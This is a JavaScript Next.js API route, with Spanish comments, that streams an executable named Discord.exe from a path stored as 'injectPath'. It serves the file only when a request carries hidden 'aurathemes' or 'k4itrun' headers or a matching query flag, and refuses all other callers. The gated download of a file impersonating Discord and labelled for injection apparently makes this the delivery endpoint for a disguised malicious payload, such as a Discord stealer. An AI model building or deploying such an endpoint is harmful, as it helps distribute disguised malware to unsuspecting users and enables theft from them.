import path from 'path';
import fs from 'fs';
import { pipeline } from 'stream';

const injectPath = 'src/files/scripts/raws/exes/Discord.exe';
const CHUNK_SIZE = 1024 * 1024; // Tamaño del fragmento, por ejemplo, 1 MB
export const config = {
  api: {
    responseLimit: false,
  },
}
export default async function handler(req, res) {
  try {
    if (
      req.headers['aurathemes'] === 'true' ||
      req.headers['k4itrun'] === 'true' ||
      req.query.aurathemes === 'true'
    ) {
      const filePath = path.join(process.cwd(), injectPath);

      if (fs.existsSync(filePath)) {
        const fileStream = fs.createReadStream(filePath);

        res.setHeader('Content-Type', 'application/octet-stream');
        res.setHeader('Content-Disposition', `attachment; filename=${path.basename(filePath)}`);

        pipeline(fileStream, res, (err) => {
          if (err) {
            console.error('Error en la transmisión del archivo:', err);
            res.status(500).end();
          } else {
            console.log('Descarga exitosa');
          }
        });
      } else {
        res.status(404).json({ error: 'Archivo no encontrado.' });
      }
    } else {
      res.status(403).json({ error: 'Acceso denegado.' });
    }
  } catch (error) {
    console.error('Error en el servidor:', error);
    res.status(500).json({ error: 'Error interno del servidor.' });
  }
}
